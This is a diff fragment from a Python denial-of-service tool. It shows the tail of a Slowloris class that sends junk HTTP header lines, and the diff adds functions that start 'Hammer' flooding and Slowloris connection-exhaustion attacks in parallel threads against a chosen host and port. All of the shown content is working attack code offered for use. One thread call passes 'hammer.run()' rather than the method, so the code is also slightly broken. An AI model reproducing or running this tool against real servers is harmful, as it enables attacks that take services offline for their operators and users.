@@ -342,10 +342,31 @@ class Slowloris:
         packet = f"X-a: {randint(1, 5000)}\r\n"
         return packet.encode('utf-8')
     
-        
-if __name__ == "__main__":
+
+def run_hammer():
+
+    hammer = Hammer(host, port, turbo)
+    threading.Thread(target=hammer.run(), daemon=True, name="HammerDos").start()
+
+def run_slowloris():
+    
+    slowloris = Slowloris(host, port, it_is_https, socket_count)
+    slowloris.run()
+
+def main():
     
     get_parameter()
-    h = Hammer(host, port, turbo)
-    threading.Thread(target=h.run(), daemon=True).start()
+    
+    hammer_thread = threading.Thread(target=run_hammer, name="HammerDos")
+    slowloris_thread = threading.Thread(target=run_slowloris, name="SlowlorisDos")
+    
+    hammer_thread.start()
+    slowloris_thread.start()
+    
+
+if __name__ == "__main__":
+    
+    main()
+    
+
     
